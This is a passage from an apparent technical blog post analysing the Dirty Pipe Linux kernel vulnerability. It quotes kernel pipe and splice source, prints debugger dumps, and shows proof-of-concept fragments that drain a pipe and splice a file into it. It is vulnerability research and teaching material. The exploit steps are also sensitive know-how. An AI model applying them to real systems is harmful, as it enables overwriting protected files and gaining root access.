&lt;p>When handling a &lt;code>write()&lt;/code> to a pipe, the kernel differentiates between two cases. First it checks if it can append (at least a part of) the data to &lt;code>page&lt;/code> of the &lt;code>pipe_buffer&lt;/code> that is currently the &lt;code>head&lt;/code> of the ring. Whether or not this is possible is decided by three things:&lt;/p>
&lt;ul>
&lt;li>is the pipe non-empty when we start writing? (implies that there are initialized buffers available)
&lt;code>!was_empty&lt;/code>&lt;/li>
&lt;li>is the &lt;code>PIPE_BUF_FLAG_CAN_MERGE&lt;/code> flag set?
&lt;code>buf-&amp;gt;flags &amp;amp; PIPE_BUF_FLAG_CAN_MERGE&lt;/code>&lt;/li>
&lt;li>is there is enough space left on the page?
&lt;code>offset + chars &amp;lt;= PAGE_SIZE&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>If the answer to all of those questions is &lt;em>yes&lt;/em> the kernel starts the write by appending to the existing page.&lt;/p>
&lt;p>To complete the rest of the write the kernel advances the &lt;code>head&lt;/code> to the next &lt;code>pipe_buffer&lt;/code>, allocates a fresh &lt;code>page&lt;/code> for it, initializes the flags (the&lt;code>PIPE_BUF_FLAG_CAN_MERGE&lt;/code> flag will be set, unless the user explicitly asked for the pipe to be in &lt;code>O_DIRECT&lt;/code> mode), and writes the data to the beginning of the new page. This continues until there is no data left to write (or the pipe is full). Regarding the &lt;code>O_DIRECT&lt;/code> mode of &lt;code>pipe()&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>[...]
O_DIRECT (since Linux 3.4)
Create a pipe that performs I/O in &amp;quot;packet&amp;quot; mode. Each
write(2) to the pipe is dealt with as a separate packet,
and read(2)s from the pipe will read one packet at a time.
[...]
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://www.man7.org/linux/man-pages/man2/pipe.2.html">source&lt;/a>&lt;/p>
&lt;p>This is handled in the &lt;code>if&lt;/code>-condition &lt;code>is_packetized(filp)&lt;/code> in &lt;code>pipe_write()&lt;/code> (see above).&lt;/p>
&lt;p>We can also see these two types of writes in the debugger. The first write is into an empty pipe and thus initializes our previously zero-filled pipe buffer.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': 0xffffea00040e3bc0
&amp;gt; 'offset': 0
&amp;gt; 'len': 8
&amp;gt; 'ops': 0xffffffff8221bb00 &amp;lt;anon_pipe_buf_ops&amp;gt;
&amp;gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
struct page at 0xffffea00040e3bc0
&amp;gt; virtual: 0xffff8881038ef000
&amp;gt; data: b'AAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
&lt;/code>&lt;/pre>&lt;p>All subsequent writes go down the &amp;ldquo;append path&amp;rdquo; and fill the existing page.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': 0xffffea00040e3bc0
&amp;gt; 'offset': 0
&amp;gt; 'len': 4096
&amp;gt; 'ops': 0xffffffff8221bb00 &amp;lt;anon_pipe_buf_ops&amp;gt;
&amp;gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
struct page at 0xffffea00040e3bc0
&amp;gt; virtual: 0xffff8881038ef000
&amp;gt; data: b'AAAAAAAAAAAAAAAAAAAA'[...]b'AAAAAAAAAAAAAAAAAAAA'
&lt;/code>&lt;/pre>&lt;h3 id="reading">Reading&lt;/h3>
&lt;p>Next, the POC drains the pipe by consuming / &lt;code>read&lt;/code>ing all the &lt;code>A&lt;/code>s from the reading end.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span>
&lt;span style="color:#a6e22e">drain_pipe&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> pipefd_r) {
&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">8&lt;/span>];
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> PAGESIZE &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (i &lt;span style="color:#f92672">==&lt;/span> PAGESIZE &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to perform last read() from pipe&amp;#34;&lt;/span>);
}
&lt;span style="color:#66d9ef">if&lt;/span> (read(pipefd_r, buf, &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L34">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The case where a process asks the kernel to &lt;code>read()&lt;/code> from a pipe is handled by the function &lt;code>pipe_read()&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t
&lt;span style="color:#a6e22e">pipe_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> kiocb &lt;span style="color:#f92672">*&lt;/span>iocb, &lt;span style="color:#66d9ef">struct&lt;/span> iov_iter &lt;span style="color:#f92672">*&lt;/span>to)
{
size_t total_len &lt;span style="color:#f92672">=&lt;/span> iov_iter_count(to);
&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>filp &lt;span style="color:#f92672">=&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_filp;
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe &lt;span style="color:#f92672">=&lt;/span> filp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>private_data;
&lt;span style="color:#66d9ef">bool&lt;/span> was_full, wake_next_reader &lt;span style="color:#f92672">=&lt;/span> false;
ssize_t ret;
...
ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
__pipe_lock(pipe);
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * We only wake up writers if the pipe was full when we started
&lt;/span>&lt;span style="color:#75715e"> * reading in order to avoid unnecessary wakeups.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * But when we do wake up writers, we do so using a sync wakeup
&lt;/span>&lt;span style="color:#75715e"> * (WF_SYNC), because we want them to get going and generate more
&lt;/span>&lt;span style="color:#75715e"> * data for us.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
was_full &lt;span style="color:#f92672">=&lt;/span> pipe_full(pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>head, pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>tail, pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>max_usage);
&lt;span style="color:#66d9ef">for&lt;/span> (;;) {
&lt;span style="color:#75715e">/* Read -&amp;gt;head with a barrier vs post_one_notification() */&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> head &lt;span style="color:#f92672">=&lt;/span> smp_load_acquire(&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>head);
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> tail &lt;span style="color:#f92672">=&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>tail;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> mask &lt;span style="color:#f92672">=&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ring_size &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
...
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>pipe_empty(head, tail)) {
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer &lt;span style="color:#f92672">*&lt;/span>buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bufs[tail &lt;span style="color:#f92672">&amp;amp;&lt;/span> mask];
size_t chars &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len;
size_t written;
&lt;span style="color:#66d9ef">int&lt;/span> error;
&lt;span style="color:#66d9ef">if&lt;/span> (chars &lt;span style="color:#f92672">&amp;gt;&lt;/span> total_len) {
...
chars &lt;span style="color:#f92672">=&lt;/span> total_len;
}
...
written &lt;span style="color:#f92672">=&lt;/span> copy_page_to_iter(buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>page, buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>offset, chars, to);
...
ret &lt;span style="color:#f92672">+=&lt;/span> chars;
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>offset &lt;span style="color:#f92672">+=&lt;/span> chars;
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len &lt;span style="color:#f92672">-=&lt;/span> chars;
...
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len) {
pipe_buf_release(pipe, buf);
...
tail&lt;span style="color:#f92672">++&lt;/span>;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>tail &lt;span style="color:#f92672">=&lt;/span> tail;
...
}
total_len &lt;span style="color:#f92672">-=&lt;/span> chars;
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>total_len)
&lt;span style="color:#66d9ef">break&lt;/span>; &lt;span style="color:#75715e">/* common path: read succeeded */&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>pipe_empty(head, tail)) &lt;span style="color:#75715e">/* More to do? */&lt;/span>
&lt;span style="color:#66d9ef">continue&lt;/span>;
}
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>writers)
&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (ret)
&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (filp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>f_flags &lt;span style="color:#f92672">&amp;amp;&lt;/span> O_NONBLOCK) {
ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>EAGAIN;
&lt;span style="color:#66d9ef">break&lt;/span>;
}
...
}
...
&lt;span style="color:#66d9ef">if&lt;/span> (ret &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
file_accessed(filp);
&lt;span style="color:#66d9ef">return&lt;/span> ret;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L231">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>If the pipe is non-empty, the data is taken from the &lt;code>tail&lt;/code>-indexed &lt;code>pipe_buffer&lt;/code> (in &lt;code>bufs&lt;/code>). In case, a buffer is emptied during a read, the &lt;code>release&lt;/code> function pointer of the &lt;code>ops&lt;/code> field of the &lt;code>pipe_buffer&lt;/code> is executed. For a &lt;code>pipe_buffer&lt;/code> that was initialized by an earlier &lt;code>write()&lt;/code>, the &lt;code>ops&lt;/code> field is a pointer to the &lt;code>struct pipe_buf_operations anon_pipe_buf_ops&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> pipe_buf_operations anon_pipe_buf_ops &lt;span style="color:#f92672">=&lt;/span> {
.release &lt;span style="color:#f92672">=&lt;/span> anon_pipe_buf_release,
.try_steal &lt;span style="color:#f92672">=&lt;/span> anon_pipe_buf_try_steal,
.get &lt;span style="color:#f92672">=&lt;/span> generic_pipe_buf_get,
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L214">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * pipe_buf_release - put a reference to a pipe_buffer
&lt;/span>&lt;span style="color:#75715e"> * @pipe: the pipe that the buffer belongs to
&lt;/span>&lt;span style="color:#75715e"> * @buf: the buffer to put a reference to
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">inline&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">pipe_buf_release&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe,
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer &lt;span style="color:#f92672">*&lt;/span>buf)
{
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> pipe_buf_operations &lt;span style="color:#f92672">*&lt;/span>ops &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ops;
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ops &lt;span style="color:#f92672">=&lt;/span> NULL;
ops&lt;span style="color:#f92672">-&amp;gt;&lt;/span>release(pipe, buf);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L197">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">anon_pipe_buf_release&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe,
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer &lt;span style="color:#f92672">*&lt;/span>buf)
{
&lt;span style="color:#66d9ef">struct&lt;/span> page &lt;span style="color:#f92672">*&lt;/span>page &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>page;
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * If nobody else uses this page, and we don&amp;#39;t already have a
&lt;/span>&lt;span style="color:#75715e"> * temporary page, let&amp;#39;s keep track of it as a one-deep
&lt;/span>&lt;span style="color:#75715e"> * allocation cache. (Otherwise just release our reference to it)
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> (page_count(page) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>tmp_page)
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>tmp_page &lt;span style="color:#f92672">=&lt;/span> page;
&lt;span style="color:#66d9ef">else&lt;/span>
put_page(page);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L125">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Thus, &lt;code>anon_pipe_buf_release()&lt;/code> is executed, which calls &lt;code>put_page()&lt;/code> to release our reference to the page. Note that while the &lt;code>ops&lt;/code> pointer is set to NULL to signal that be buffer has been released, the &lt;code>page&lt;/code> and &lt;code>flags&lt;/code> fields of the &lt;code>pipe_buffer&lt;/code> are left unmodified. It is thus the responsibility of code that might reuse a pipe buffer to initialize all its fields, otherwise the values are &amp;ldquo;uninitialized&amp;rdquo;. We can confirm this by printing the pipe structures after the last read.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct pipe_inode_info at 0xffff8881044aec00
&amp;gt; 'head': 1
&amp;gt; 'tail': 1
&amp;gt; 'ring_size': 1
&amp;gt; 'bufs': 0xffff888101f8a180
struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': 0xffffea00040e3bc0
&amp;gt; 'offset': 4096
&amp;gt; 'len': 0
&amp;gt; 'ops': NULL
&amp;gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
&lt;/code>&lt;/pre>&lt;h3 id="summary">Summary&lt;/h3>
&lt;p>For us, the key takeaways are:&lt;/p>
&lt;ol>
&lt;li>Writes to a pipe can append to the &lt;code>page&lt;/code> of a &lt;code>pipe_buffer&lt;/code> if its &lt;code>PIPE_BUF_FLAG_CAN_MERGE&lt;/code> flag is set.&lt;/li>
&lt;li>This flag is set by default for buffers that are initialized by writes.&lt;/li>
&lt;li>Emptying a pipe with a &lt;code>read()&lt;/code> leaves the &lt;code>pipe_buffer&lt;/code>s' flags unmodified.&lt;/li>
&lt;/ol>
&lt;p>However, &lt;code>write&lt;/code>s to a pipe are not the only way fill it!&lt;/p>
&lt;h2 id="pipes-splicing">Pipes (splicing)&lt;/h2>
&lt;p>Besides reading and writing, the Linux programming interface also offers the &lt;code>splice&lt;/code> syscall for moving data from or to a pipe. This is what our PoC does next.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c"> pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to splice() file to pipe&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (splice(tfd, &lt;span style="color:#ae81ff">0&lt;/span>, pipefds[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L76">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Since this syscall may not be as well-known as the others, let&amp;rsquo;s briefly discuss it from a user&amp;rsquo;s perspective.&lt;/p>
&lt;h3 id="the-splice-system-call-user-land">The &lt;code>splice&lt;/code> System Call (user land)&lt;/h3>
&lt;pre tabindex="0">&lt;code>SPLICE(2) Linux Programmer's Manual SPLICE(2)
NAME
splice - splice data to/from a pipe
SYNOPSIS
#define _GNU_SOURCE /* See feature_test_macros(7) */
#include &amp;lt;fcntl.h&amp;gt;
ssize_t splice(int fd_in, off64_t *off_in, int fd_out,
off64_t *off_out, size_t len, unsigned int flags);
DESCRIPTION
splice() moves data between two file descriptors without copying between kernel
address space and user address space. It transfers up to len bytes of data from
the file descriptor fd_in to the file descriptor fd_out, where one of the file
descriptors must refer to a pipe.
The following semantics apply for fd_in and off_in:
* If fd_in refers to a pipe, then off_in must be NULL.
* If fd_in does not refer to a pipe and off_in is NULL, then bytes are read from
fd_in starting from the file offset, and the file offset is adjusted appropri‐
ately.
* If fd_in does not refer to a pipe and off_in is not NULL, then off_in must
point to a buffer which specifies the starting offset from which bytes will be
read from fd_in; in this case, the file offset of fd_in is not changed.
Analogous statements apply for fd_out and off_out.
&lt;/code>&lt;/pre>&lt;p>As mentioned above, a process can obtain a file descriptor using the &lt;code>sys_open&lt;/code> system call. If the process wishes to write the file content (or a part of it) into a pipe it has different options. It could &lt;code>read()&lt;/code> the data from the file into a buffer in its memory (or &lt;code>mmap()&lt;/code> the file) and then &lt;code>write()&lt;/code> it to the pipe. However, this involves a total of three context switches (kernel-user-space boundary). To make this whole operation more efficient the Linux kernel implements the &lt;code>sys_splice&lt;/code> system call. It essentially does the copying (not really a copy, see below) directly from one file descriptor to another one within the kernel space. As we will see, this makes a lot of sense because the content of a file or a pipe is already present in the kernel memory as a buffer or page or another structure.
One of &lt;code>fd_in&lt;/code> or &lt;code>fd_out&lt;/code> must be a pipe. The other &lt;code>fd_xxx&lt;/code> can be another pipe, a file, a socket, a block device, a character device. See Max Kellermann&amp;rsquo;s original blog post for an example how splicing is used to optimize real-world software (and how this application lead him to finding this bug :) Check out &lt;a href="https://web.archive.org/web/20130521163124/http://kerneltrap.org/node/6505">this&lt;/a> to read how Linus Torvalds himself explains the &lt;code>splice&lt;/code> system call 8-)&lt;/p>
&lt;h3 id="the-splice-system-call-implementation">The &lt;code>splice&lt;/code> System Call (Implementation)&lt;/h3>
&lt;p>The &lt;em>very&lt;/em> high level idea of the &lt;code>splice&lt;/code> implementation is illustrated in the following figure. After splicing, both, the pipe and the page cache, have different views of the same underlying data in memory. &lt;em>You might want to open this SVG image in a new tab and zoom in a bit.&lt;/em>
&lt;img src="https://lolcads.github.io/2022/06/pipe_and_page_cache.svg" alt="Pipe and Page Cache Overview">&lt;/p>
&lt;p>To see that this figure is correct, we start from the system call&amp;rsquo;s entry point &lt;code>SYSCALL_DEFINE6(splice,...)&lt;/code>, and first arrive at the function &lt;code>__do_splice()&lt;/code> that is responsible for copying the offset values from and to user space. The called function &lt;code>do_splice()&lt;/code> determines if we want to splice to, from or between pipes. In the first case the function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">do_splice_to&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>in, loff_t &lt;span style="color:#f92672">*&lt;/span>ppos,
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe, size_t len,
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> flags);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>is called, which executes&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">in&lt;span style="color:#f92672">-&amp;gt;&lt;/span>f_op&lt;span style="color:#f92672">-&amp;gt;&lt;/span>splice_read(in, ppos, pipe, len, flags);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/splice.c#L773">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>From here on, the execution path depends on the type of file we want to splice to the pipe. Since our target is a regular file and our VM uses the &lt;code>ext2&lt;/code> file system, the correct implementation is found in &lt;code>ext2_file_operations&lt;/code>. Note: If you debug the exploit on another machine with e.g. ext4 file system, feel free to follow this path&amp;hellip; we&amp;rsquo;ll meet again later ;) If you interested in this nice abstraction check out the &lt;a href="https://www.kernel.org/doc/html/latest/filesystems/vfs.html">Linux Virtual File System&lt;/a> documentation.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations ext2_file_operations &lt;span style="color:#f92672">=&lt;/span> {
...
.read_iter &lt;span style="color:#f92672">=&lt;/span> ext2_file_read_iter,
...
.splice_read &lt;span style="color:#f92672">=&lt;/span> generic_file_splice_read,
...
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/ext2/file.c#L182">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Calling &lt;code>generic_file_splice_read()&lt;/code> (eventually&amp;hellip;) leads us to &lt;code>filemap_read()&lt;/code>. Notice that at this point we switch from the file system &lt;code>fs/&lt;/code> into the &lt;a href="https://www.kernel.org/doc/html/latest/core-api/mm-api.html">memory management&lt;/a> &lt;code>mm/&lt;/code> subsystem of the kernel.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * filemap_read - Read data from the page cache.
&lt;/span>&lt;span style="color:#75715e"> * @iocb: The iocb to read.
&lt;/span>&lt;span style="color:#75715e"> * @iter: Destination for the data.
&lt;/span>&lt;span style="color:#75715e"> * @already_read: Number of bytes already read by the caller.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * Copies data from the page cache. If the data is not currently present,
&lt;/span>&lt;span style="color:#75715e"> * uses the readahead and readpage address_space operations to fetch it.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * Return: Total number of bytes copied, including those already read by
&lt;/span>&lt;span style="color:#75715e"> * the caller. If an error happens before any bytes are copied, returns
&lt;/span>&lt;span style="color:#75715e"> * a negative error number.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
ssize_t &lt;span style="color:#a6e22e">filemap_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> kiocb &lt;span style="color:#f92672">*&lt;/span>iocb, &lt;span style="color:#66d9ef">struct&lt;/span> iov_iter &lt;span style="color:#f92672">*&lt;/span>iter,
ssize_t already_read)
{
&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>filp &lt;span style="color:#f92672">=&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_filp;
&lt;span style="color:#66d9ef">struct&lt;/span> file_ra_state &lt;span style="color:#f92672">*&lt;/span>ra &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>filp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>f_ra;
&lt;span style="color:#66d9ef">struct&lt;/span> address_space &lt;span style="color:#f92672">*&lt;/span>mapping &lt;span style="color:#f92672">=&lt;/span> filp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>f_mapping;
&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode &lt;span style="color:#f92672">=&lt;/span> mapping&lt;span style="color:#f92672">-&amp;gt;&lt;/span>host;
&lt;span style="color:#66d9ef">struct&lt;/span> folio_batch fbatch;
...
folio_batch_init(&lt;span style="color:#f92672">&amp;amp;&lt;/span>fbatch);
...
&lt;span style="color:#66d9ef">do&lt;/span> {
...
error &lt;span style="color:#f92672">=&lt;/span> filemap_get_pages(iocb, iter, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fbatch);
...
&lt;span style="color:#66d9ef">for&lt;/span> (i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> folio_batch_count(&lt;span style="color:#f92672">&amp;amp;&lt;/span>fbatch); i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">struct&lt;/span> folio &lt;span style="color:#f92672">*&lt;/span>folio &lt;span style="color:#f92672">=&lt;/span> fbatch.folios[i];
size_t fsize &lt;span style="color:#f92672">=&lt;/span> folio_size(folio);
size_t offset &lt;span style="color:#f92672">=&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_pos &lt;span style="color:#f92672">&amp;amp;&lt;/span> (fsize &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
size_t bytes &lt;span style="color:#f92672">=&lt;/span> min_t(loff_t, end_offset &lt;span style="color:#f92672">-&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_pos,
